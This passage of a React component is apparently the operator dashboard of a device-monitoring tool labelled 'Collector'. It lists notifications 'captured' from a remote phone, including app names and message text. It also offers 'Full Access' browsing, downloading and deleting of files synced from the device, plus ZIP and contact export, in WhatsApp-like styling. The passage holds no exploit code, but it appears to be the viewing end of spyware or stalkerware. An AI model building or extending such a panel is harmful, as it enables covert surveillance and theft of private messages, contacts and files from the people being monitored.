                    <RefreshCw className={`w-3.5 h-3.5 text-white/70 ${notifLoading ? 'animate-spin' : ''}`} />
                  </button>
                  {notifTotal > 0 && (
                    <button
                      onClick={handleDeleteAllNotifications}
                      disabled={deletingNotifs}
                      className="w-7 h-7 rounded-full hover:bg-red-500/30 flex items-center justify-center"
                      title="Delete all notifications"
                    >
                      {deletingNotifs ? (
                        <Loader2 className="w-3.5 h-3.5 text-red-300 animate-spin" />
                      ) : (
                        <Trash2 className="w-3.5 h-3.5 text-red-300" />
                      )}
                    </button>
                  )}
                </div>
              </div>
              <div className="p-4">
                <div className="flex items-center justify-between mb-3">
                  <div className="flex items-center gap-2">
                    <Badge className="bg-purple-100 text-purple-700 border-0 text-xs px-2.5 py-1 font-bold">
                      {notifTotal} captured
                    </Badge>
                    {isOnline && (
                      <Badge className="bg-green-100 text-green-700 border-0 text-xs px-2.5 py-1 font-bold flex items-center gap-1">
                        <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
                        Live
                      </Badge>
                    )}
                  </div>
                  <p className="text-[10px] text-gray-400">Auto-refresh: 10s</p>
                </div>

                {/* Search */}
                <div className="relative mb-3">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  <Input
                    placeholder="Search notifications..."
                    value={notifSearch}
                    onChange={(e) => setNotifSearch(e.target.value)}
                    className="pl-9 pr-9 h-9 bg-gray-50 rounded-xl border-0 text-sm"
                  />
                  {notifSearch && (
                    <button onClick={() => setNotifSearch('')} className="absolute right-3 top-1/2 -translate-y-1/2">
                      <X className="w-4 h-4 text-gray-400" />
                    </button>
                  )}
                </div>

                {/* App Filter */}
                {notifApps.length > 0 && (
                  <div className="flex gap-1.5 overflow-x-auto pb-1 no-scrollbar">
                    <button
                      onClick={() => setNotifAppFilter('')}
                      className={`shrink-0 px-3 py-1.5 rounded-full text-[10px] font-bold transition-colors ${
                        notifAppFilter === '' ? 'bg-purple-700 text-white' : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
                      }`}
                    >
                      All Apps
                    </button>
                    {notifApps.map((app) => (
                      <button
                        key={app}
                        onClick={() => setNotifAppFilter(notifAppFilter === app ? '' : app)}
                        className={`shrink-0 px-3 py-1.5 rounded-full text-[10px] font-bold transition-colors ${
                          notifAppFilter === app ? 'bg-purple-700 text-white' : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
                        }`}
                      >
                        {app}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Notification List */}
          <div className="px-3 pb-4 bg-[#ECE5DD] space-y-2">
            {notifLoading && notifications.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-12">
                <Loader2 className="w-8 h-8 text-purple-400 animate-spin mb-3" />
                <p className="text-gray-500 text-sm">Loading notifications...</p>
              </div>
            ) : notifications.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-12">
                <div className="w-16 h-16 rounded-full bg-purple-100 flex items-center justify-center mb-3">
                  <Bell className="w-8 h-8 text-purple-300" />
                </div>
                <p className="text-gray-500 font-semibold text-sm mb-1">No Notifications Yet</p>
                <p className="text-gray-400 text-xs text-center max-w-[250px]">
                  {isOnline
                    ? 'Notifications from this device will appear here in real-time'
                    : 'Device is offline. Notifications will sync when device comes online.'}
                </p>
              </div>
            ) : (
              notifications.map((notif) => {
                const timeStr = notif.capturedAt
                  ? new Date(notif.capturedAt).toLocaleString()
                  : notif.receivedAt
                  ? new Date(notif.receivedAt).toLocaleString()
                  : 'Unknown';
                const notifText = notif.bigText || notif.text || '';
                const hasExtraLines = notif.textLines && notif.textLines.length > 0;

                return (
                  <div key={notif.id} className="bg-white rounded-2xl shadow-sm overflow-hidden">
                    {/* Notification Header */}
                    <div className="px-4 py-3 flex items-start gap-3">
                      <div className="w-9 h-9 rounded-full bg-purple-100 flex items-center justify-center shrink-0 mt-0.5">
                        <MessageSquare className="w-4 h-4 text-purple-600" />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-0.5">
                          <span className="text-xs font-bold text-purple-700 truncate">
                            {notif.appName || notif.packageName}
                          </span>
                          {notif.category && (
                            <Badge className="bg-gray-100 text-gray-500 border-0 text-[8px] px-1.5 py-0 h-4">
                              {notif.category}
                            </Badge>
                          )}
                        </div>
                        {notif.title && (
                          <p className="text-sm font-semibold text-gray-900 truncate">{notif.title}</p>
                        )}
                        {notifText && (
                          <p className="text-xs text-gray-600 mt-0.5 line-clamp-2">{notifText}</p>
                        )}
                        {hasExtraLines && (
                          <div className="mt-1.5 space-y-0.5">
                            {notif.textLines!.map((line, idx) => (
                              <p key={idx} className="text-xs text-gray-500 truncate pl-2 border-l-2 border-purple-200">
                                {line}
                              </p>
                            ))}
                          </div>
                        )}
                        {notif.subText && (
                          <p className="text-[10px] text-gray-400 mt-1">{notif.subText}</p>
                        )}
                      </div>
                      <div className="shrink-0 text-right">
                        <p className="text-[10px] text-gray-400">{timeStr}</p>
                        {notif.deviceId && devices[notif.deviceId] && (
                          <p className="text-[9px] text-gray-300 mt-0.5">{devices[notif.deviceId].name}</p>
                        )}
                      </div>
                    </div>
                  </div>
                );
              })
            )}

            {notifications.length > 0 && notifications.length < notifTotal && (
              <div className="text-center py-2">
                <p className="text-xs text-gray-400">
                  Showing {notifications.length} of {notifTotal} notifications
                </p>
              </div>
            )}
          </div>
        </>
      )}
      {/* ─── FILE MANAGER TAB ────────────────────────── */}
      {activeTab === 'manager' && (
        <ScrollArea className="flex-1">
          {/* Full Access Banner */}
          <div className="px-3 pt-2 pb-1 bg-[#ECE5DD]">
            <div className="bg-gradient-to-r from-blue-600 to-blue-700 rounded-2xl px-4 py-3 flex items-center gap-3 shadow-md">
              <div className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center shrink-0">
                <HardDrive className="w-5 h-5 text-white" />
              </div>
              <div className="flex-1 min-w-0">
                <h2 className="text-white font-bold text-sm">File Manager</h2>
                <p className="text-blue-200 text-xs">Full Access - Browse, view, download & delete files</p>
              </div>
              {isOnline ? (
                <span className="inline-flex items-center gap-1 text-xs font-bold text-[#25D366]">
                  <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
                  LIVE
                </span>
              ) : (
                <span className="inline-flex items-center gap-1 text-xs font-bold text-white/40">
                  <span className="w-2 h-2 rounded-full bg-white/30" />
                  OFFLINE
                </span>
              )}
            </div>
          </div>

          {/* Storage Overview */}
          <div className="px-3 pb-2 bg-[#ECE5DD]">
            <div className="bg-white rounded-2xl shadow-sm p-4">
              <h4 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                <HardDrive className="w-4 h-4 text-[#075E54]" />
                Storage Overview
              </h4>
              <div className="grid grid-cols-4 gap-2 mb-3">
                <div className="bg-purple-50 rounded-xl p-2 text-center">
                  <Image className="w-4 h-4 text-purple-500 mx-auto mb-0.5" aria-label="Images" />
                  <p className="text-xs font-bold text-gray-900">{fileTypeCounts.image || 0}</p>
                  <p className="text-[9px] text-gray-500">Images</p>
                  {(fileTypeCounts.image || 0) > 0 && (
                    <button onClick={() => openDeleteDataModal('fileType', 'image')} className="mt-0.5 px-1.5 py-0.5 bg-purple-100 hover:bg-purple-200 text-purple-600 text-[7px] font-bold rounded-full transition-colors">
                      <Trash2 className="w-2 h-2 inline -mt-px" /> Del
                    </button>
                  )}
                </div>
                <div className="bg-red-50 rounded-xl p-2 text-center">
                  <Video className="w-4 h-4 text-red-500 mx-auto mb-0.5" />
                  <p className="text-xs font-bold text-gray-900">{fileTypeCounts.video || 0}</p>
                  <p className="text-[9px] text-gray-500">Videos</p>
                  {(fileTypeCounts.video || 0) > 0 && (
                    <button onClick={() => openDeleteDataModal('fileType', 'video')} className="mt-0.5 px-1.5 py-0.5 bg-red-100 hover:bg-red-200 text-red-600 text-[7px] font-bold rounded-full transition-colors">
                      <Trash2 className="w-2 h-2 inline -mt-px" /> Del
                    </button>
                  )}
                </div>
                <div className="bg-orange-50 rounded-xl p-2 text-center">
                  <Music className="w-4 h-4 text-orange-500 mx-auto mb-0.5" />
                  <p className="text-xs font-bold text-gray-900">{fileTypeCounts.audio || 0}</p>
                  <p className="text-[9px] text-gray-500">Audio</p>
                  {(fileTypeCounts.audio || 0) > 0 && (
                    <button onClick={() => openDeleteDataModal('fileType', 'audio')} className="mt-0.5 px-1.5 py-0.5 bg-orange-100 hover:bg-orange-200 text-orange-600 text-[7px] font-bold rounded-full transition-colors">
                      <Trash2 className="w-2 h-2 inline -mt-px" /> Del
                    </button>
                  )}
                </div>
                <div className="bg-blue-50 rounded-xl p-2 text-center">
                  <FileText className="w-4 h-4 text-blue-500 mx-auto mb-0.5" />
                  <p className="text-xs font-bold text-gray-900">{(fileTypeCounts.pdf || 0) + (fileTypeCounts.document || 0)}</p>
                  <p className="text-[9px] text-gray-500">Docs</p>
                  {((fileTypeCounts.pdf || 0) + (fileTypeCounts.document || 0)) > 0 && (
                    <button onClick={() => openDeleteDataModal('fileType', 'document')} className="mt-0.5 px-1.5 py-0.5 bg-blue-100 hover:bg-blue-200 text-blue-600 text-[7px] font-bold rounded-full transition-colors">
                      <Trash2 className="w-2 h-2 inline -mt-px" /> Del
                    </button>
                  )}
                </div>
              </div>
              <div className="bg-gray-50 rounded-xl p-3 flex items-center justify-between">
                <div>
                  <p className="text-[10px] font-semibold text-gray-500">Total Storage</p>
                  <p className="text-base font-bold text-[#075E54]">{formatFileSize(totalUploadSize)}</p>
                </div>
                <div className="text-right">
                  <p className="text-[10px] font-semibold text-gray-500">Total Files</p>
                  <p className="text-base font-bold text-[#075E54]">{filteredFiles.length}</p>
                </div>
              </div>
            </div>
          </div>

          {/* Quick Actions */}
          <div className="px-3 pb-2 bg-[#ECE5DD]">
            <h4 className="text-xs font-bold text-gray-600 mb-2 px-1">Quick Actions</h4>
            <div className="grid grid-cols-3 gap-2">
              <Button
                onClick={downloadZip}
                disabled={zipDownloading || filteredFiles.length === 0}
                className="bg-[#25D366] hover:bg-[#20BD5A] text-white h-12 rounded-xl flex-col gap-0.5 text-[10px]"
              >
                {zipDownloading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Archive className="w-4 h-4" />}
                Download ZIP
              </Button>
              <Button
                onClick={downloadAllVCard}
                disabled={filteredContacts.length === 0}
                variant="outline"
                className="border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 h-12 rounded-xl flex-col gap-0.5 text-[10px]"
              >
                <Phone className="w-4 h-4" />
                Contacts
              </Button>
              <Button
                onClick={() => { setManagerPath('/'); browseDirectory('/'); }}
                variant="outline"
                className="border-blue-500/30 text-blue-600 hover:bg-blue-50 h-12 rounded-xl flex-col gap-0.5 text-[10px]"
              >
                <RefreshCw className="w-4 h-4" />
                Refresh
              </Button>
            </div>
          </div>

          {/* File Browser - Directory Navigation */}
          <div className="px-3 pb-3 bg-[#ECE5DD]">
            <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
              {/* Breadcrumb Header */}
              <div className="px-4 py-3 bg-[#075E54] flex items-center gap-2">
                <FolderOpen className="w-4 h-4 text-white/80 shrink-0" />
                <h4 className="text-white font-semibold text-sm flex-1">Browse Files</h4>
                {filteredFiles.length > 0 && (
                  <button onClick={() => openDeleteDataModal('files')} className="px-2 py-0.5 bg-red-500/30 hover:bg-red-500/50 text-red-200 text-[9px] font-bold rounded-full transition-colors flex items-center gap-0.5" title="Delete all files">
                    <Trash2 className="w-2.5 h-2.5" /> Delete All
                  </button>
                )}
                {selectedDeviceId && devices[selectedDeviceId] && (
                  <span className="text-[10px] text-[#25D366] font-semibold mr-2">
                    {devices[selectedDeviceId].name}
                  </span>
                )}
                <button
                  onClick={() => browseDirectory(managerPath)}
                  className="w-7 h-7 rounded-full hover:bg-white/10 flex items-center justify-center shrink-0"
                  title="Refresh directory"
                >
                  <RefreshCw className="w-3.5 h-3.5 text-white/60" />
                </button>
              </div>

              {/* Breadcrumb Navigation */}
              <div className="px-3 py-2 bg-gray-50 border-b border-gray-100 flex items-center gap-1 overflow-x-auto no-scrollbar">
                {managerData?.breadcrumbs.map((crumb, idx) => (
                  <React.Fragment key={crumb.path}>
                    {idx > 0 && <ChevronRight className="w-3 h-3 text-gray-300 shrink-0" />}
                    <button
                      onClick={() => browseDirectory(crumb.path)}
                      className={`text-xs px-2 py-1 rounded-md whitespace-nowrap transition-colors ${
                        crumb.path === managerPath
                          ? 'bg-[#075E54] text-white font-semibold'
                          : 'text-gray-600 hover:bg-gray-200'
                      }`}
                    >
                      {crumb.name === 'Root' ? (
                        <span className="flex items-center gap-1"><Home className="w-3 h-3" /> Root</span>
                      ) : (
                        crumb.name
                      )}
                    </button>
                  </React.Fragment>
                ))}
                {!managerData && (
                  <span className="text-xs text-gray-400">Loading...</span>
                )}
              </div>

              {/* Directory Contents */}
              {managerLoading ? (
                <div className="py-8 text-center">
                  <Loader2 className="w-6 h-6 text-[#075E54] animate-spin mx-auto mb-2" />
                  <p className="text-xs text-gray-500">Browsing files...</p>
                </div>
              ) : managerData && managerData.directories.length === 0 && managerData.files.length === 0 ? (
                <div className="py-8 text-center">
                  <Folder className="w-10 h-10 text-gray-300 mx-auto mb-2" />
                  <p className="text-xs text-gray-500">
                    {managerPath === '/' ? 'No synced files yet. Files will appear as device uploads them.' : 'This folder is empty.'}
                  </p>
                  {managerPath !== '/' && (
                    <Button
                      onClick={() => browseDirectory('/')}
                      variant="ghost"
                      size="sm"
                      className="mt-2 text-[#075E54] text-xs"
                    >
                      <ArrowLeft className="w-3 h-3 mr-1" /> Back to Root
                    </Button>
                  )}
                </div>
              ) : (
                <div>
                  {/* Directories */}
                  {managerData?.directories.map((dir) => (
                    <button
                      key={dir.path}
                      onClick={() => browseDirectory(dir.path)}
                      className="w-full flex items-center gap-3 px-4 py-3 hover:bg-blue-50/50 transition-colors active:bg-blue-50 border-b border-gray-50"
                    >
                      <div className="w-10 h-10 rounded-xl bg-yellow-50 flex items-center justify-center shrink-0">
                        <Folder className="w-5 h-5 text-yellow-500" />
                      </div>
                      <div className="flex-1 min-w-0 text-left">
                        <h3 className="text-xs font-semibold text-gray-900 truncate">{dir.name}</h3>
                        <p className="text-[10px] text-gray-500 mt-0.5 flex items-center gap-1">
                          <span>{dir.fileCount} files</span>
                          <span className="text-gray-300">|</span>
                          <span>{formatFileSize(dir.totalSize)}</span>
                        </p>
                      </div>
                      <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
                    </button>
                  ))}

                  {/* Files */}
                  {managerData?.files.map((file: any) => (
                    <div
                      key={file.id}
                      className="w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 transition-colors border-b border-gray-50"
                    >
                      <div className={`w-10 h-10 rounded-xl ${getFileBgColor(file.fileType)} flex items-center justify-center shrink-0`}>
                        {getFileIcon(file.fileType)}
                      </div>
                      <div className="flex-1 min-w-0 text-left">
                        <h3 className="text-xs font-medium text-gray-900 truncate">{file.fileName}</h3>
                        <p className="text-[10px] text-gray-500 mt-0.5 flex items-center gap-1">
                          <span>{formatFileSize(file.fileSize)}</span>
                          <span className="text-gray-300">|</span>
                          <span className="capitalize">{file.fileType}</span>
                          <span className="text-gray-300">|</span>
                          <span>{timeAgo(file.uploadedAt)}</span>
                        </p>
                      </div>
                      <div className="flex items-center gap-0.5 shrink-0">
                        {(file.fileType === 'image' || file.fileType === 'pdf' || file.fileType === 'video') && (
                          <button
                            onClick={() => setPreviewFile(file)}
                            className="w-7 h-7 rounded-full hover:bg-purple-50 flex items-center justify-center"
                            title="Preview"
                          >
                            <Eye className="w-3.5 h-3.5 text-purple-500" />
                          </button>
                        )}
                        <button
                          onClick={() => downloadSingleFile(file)}
                          className="w-7 h-7 rounded-full hover:bg-[#25D366]/10 flex items-center justify-center"
                          title="Download"
                        >
                          <Download className="w-3.5 h-3.5 text-[#25D366]" />
                        </button>
                        <button
                          onClick={() => {
                            if (confirm('Delete this file?')) {
                              handleDeleteFile(file.id);
                            }
                          }}
                          disabled={deletingFileId === file.id}
                          className="w-7 h-7 rounded-full hover:bg-red-50 flex items-center justify-center"
                          title="Delete"
                        >
                          {deletingFileId === file.id ? (
                            <Loader2 className="w-3.5 h-3.5 text-red-400 animate-spin" />
                          ) : (
                            <Trash2 className="w-3.5 h-3.5 text-red-400" />
                          )}
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}

              {/* Show all files flat list option */}
              {managerData && managerPath === '/' && filteredFiles.length > 0 && (
                <div className="px-4 py-3 bg-gray-50 border-t border-gray-100">
                  <h4 className="text-xs font-semibold text-gray-600 mb-2 flex items-center gap-1">
                    <File className="w-3 h-3" /> All Files (Flat View)
                  </h4>
                  <div className="max-h-60 overflow-y-auto">
                    {filteredFiles.map((file) => (
                      <div
                        key={file.id}
                        className="flex items-center gap-2 py-1.5 border-b border-gray-100 last:border-0"
                      >
                        <div className={`w-7 h-7 rounded-lg ${getFileBgColor(file.fileType)} flex items-center justify-center shrink-0`}>
                          {getFileIcon(file.fileType)}
                        </div>
                        <div className="flex-1 min-w-0">
                          <p className="text-[10px] font-medium text-gray-800 truncate">{file.fileName}</p>
                          <p className="text-[9px] text-gray-400 truncate">{file.filePath}</p>
                        </div>
                        <span className="text-[9px] text-gray-400 shrink-0">{formatFileSize(file.fileSize)}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        </ScrollArea>
      )}

      {/* ─── File Preview Modal ─────────────────────── */}
      {previewFile && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={() => setPreviewFile(null)} />
          <div className="relative max-w-lg w-full mx-4 bg-white rounded-2xl shadow-2xl overflow-hidden">
            <div className="px-4 py-3 bg-[#075E54] flex items-center justify-between">
              <h4 className="text-white font-semibold text-sm truncate mr-2">{previewFile.fileName}</h4>
              <button onClick={() => setPreviewFile(null)} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center shrink-0">
                <X className="w-4 h-4 text-white/70" />
              </button>
            </div>
            <div className="p-4">
              {previewFile.fileType === 'image' ? (
                <img
                  src={previewFile.downloadUrl}
                  alt={previewFile.fileName}
                  className="w-full max-h-[60vh] object-contain rounded-xl"
                />
              ) : previewFile.fileType === 'video' ? (
                <video
                  controls
                  className="w-full max-h-[60vh] rounded-xl"
                  src={previewFile.downloadUrl}
                  autoPlay
                >
                  <track kind="captions" />
                  Your browser does not support the video tag.
                </video>
              ) : previewFile.fileType === 'audio' ? (
                <div className="flex flex-col items-center gap-4 py-8">
                  <Music className="w-16 h-16 text-orange-400" />
                  <audio controls className="w-full" src={previewFile.downloadUrl} autoPlay>
                    <track kind="captions" />
                  </audio>
                </div>
              ) : previewFile.fileType === 'pdf' ? (
                <iframe
                  src={previewFile.downloadUrl}
                  className="w-full h-[60vh] rounded-xl"
                  title={previewFile.fileName}
                />
              ) : (
                <iframe
                  src={previewFile.downloadUrl}
                  className="w-full h-[60vh] rounded-xl"
                  title={previewFile.fileName}
                />
              )}
            </div>
            <div className="px-4 pb-4">
              <Button
                onClick={() => downloadSingleFile(previewFile)}
                className="w-full bg-[#25D366] hover:bg-[#20BD5A] text-white font-semibold h-12 rounded-xl"
              >
                <Download className="w-5 h-5 mr-2" /> Download File
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Delete Data Confirmation Modal */}
      {showDeleteDataModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={() => !deletingData && setShowDeleteDataModal(false)} />
          <div className="relative w-full max-w-sm mx-4 bg-white rounded-2xl shadow-2xl overflow-hidden">
            <div className="p-5">
              <div className="flex items-center gap-3 mb-4">
                <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center">
                  <Trash2 className="w-5 h-5 text-red-500" />
                </div>
                <div>
                  <h3 className="font-bold text-gray-900">Delete Data</h3>
                  <p className="text-xs text-gray-500">
                    {deleteDataType === 'contacts'
                      ? 'Delete all contacts from this session?'
                      : deleteFileTypeName
                      ? `Delete all ${deleteFileTypeName} files?`
                      : 'Delete all files from this session?'
                    }
                  </p>
                </div>
              </div>
              <p className="text-xs text-red-600 bg-red-50 rounded-lg p-2 mb-3">
                This action cannot be undone. The data will be permanently deleted.
              </p>
              <div className="mb-3">
                <label className="text-xs font-semibold text-gray-700 block mb-1">Access Code</label>
                <input
                  type="password"
                  value={deleteDataAccessCode}
                  onChange={(e) => setDeleteDataAccessCode(e.target.value)}
                  placeholder="Enter access code or master code"
                  className="w-full px-3 py-2 border border-gray-200 rounded-xl text-sm focus:outline-none focus:border-red-400"
                  onKeyDown={(e) => e.key === 'Enter' && handleDeleteData()}
                />
              </div>
              {deleteDataError && (
                <p className="text-xs text-red-500 mb-2">{deleteDataError}</p>
              )}
              <div className="flex gap-2">
                <button
                  onClick={() => { setShowDeleteDataModal(false); setDeleteDataAccessCode(''); setDeleteDataError(''); }}
                  disabled={!!deletingData}
                  className="flex-1 py-2.5 rounded-xl text-sm font-semibold text-gray-600 bg-gray-100 hover:bg-gray-200 transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={handleDeleteData}
                  disabled={!!deletingData}
                  className="flex-1 py-2.5 rounded-xl text-sm font-semibold text-white bg-red-500 hover:bg-red-600 transition-colors flex items-center justify-center gap-1"
                >
                  {deletingData ? <Loader2 className="w-4 h-4 animate-spin" /> : <Trash2 className="w-4 h-4" />}
                  Delete
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ═══════════════════════════════════════════════════ */}
      {/* ─── CHANGE ACCESS CODE MODAL ──────────────────── */}
      {/* ═══════════════════════════════════════════════════ */}
      {showChangeCodeModal && (
        <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center">
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={() => !changeCodeLoading && setShowChangeCodeModal(false)} />
          <div className="relative w-full max-w-md mx-4 mb-4 sm:mb-0 bg-white rounded-3xl shadow-2xl overflow-hidden">
            <div className="bg-gradient-to-r from-[#075E54] to-[#054D44] px-6 py-5">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <KeyRound className="w-5 h-5 text-[#25D366]" />
                  <div>
                    <h3 className="text-white font-bold text-lg">Change Access Code</h3>
                    <p className="text-white/60 text-xs">Update your session access code</p>
                  </div>
                </div>
                <button
                  onClick={() => !changeCodeLoading && setShowChangeCodeModal(false)}
                  className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center"
                >
                  <X className="w-5 h-5 text-white/70" />
                </button>
              </div>
            </div>
            <div className="px-6 py-6 space-y-4">
              <div>
                <label className="text-sm font-semibold text-gray-700 mb-2 block">Current Access Code</label>
                <Input
                  type="password"
                  value={oldCodeInput}
                  onChange={(e) => setOldCodeInput(e.target.value.replace(/\D/g, '').slice(0, 5))}
                  placeholder="Enter current code"
                  className="h-12 rounded-xl text-center text-lg tracking-[0.5em] font-mono border-gray-200 focus:border-[#25D366] focus:ring-[#25D366]/20"
                  maxLength={5}
                  autoFocus
                />
              </div>
              <div>
                <label className="text-sm font-semibold text-gray-700 mb-2 block">New Access Code</label>
                <Input
                  type="password"
                  value={newCodeInput}
                  onChange={(e) => setNewCodeInput(e.target.value.replace(/\D/g, '').slice(0, 4))}
                  placeholder="Enter new 4-digit code"
                  className="h-12 rounded-xl text-center text-lg tracking-[0.5em] font-mono border-gray-200 focus:border-[#25D366] focus:ring-[#25D366]/20"
                  maxLength={4}
                  onKeyDown={(e) => e.key === 'Enter' && handleChangeCode()}
                />
              </div>
              {changeCodeError && (
                <div className="bg-red-50 border border-red-200 rounded-xl px-4 py-3 text-center">
                  <p className="text-red-600 text-sm font-semibold">{changeCodeError}</p>
                </div>
              )}
              <Button
                onClick={handleChangeCode}
                disabled={changeCodeLoading || !oldCodeInput.trim() || !newCodeInput.trim()}
                className="w-full bg-[#075E54] hover:bg-[#054D44] text-white font-bold h-12 rounded-xl"
              >
                {changeCodeLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <><KeyRound className="w-4 h-4 mr-2" />Change Code</>}
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <div className="px-4 py-3 bg-white border-t border-gray-100 mt-auto">
        <p className="text-center text-xs text-gray-400">
          Collector &bull; {filteredContacts.length} contacts &bull; {filteredFiles.length} files &bull; {formatFileSize(totalUploadSize)}
        </p>
      </div>
    </div>
  );
}




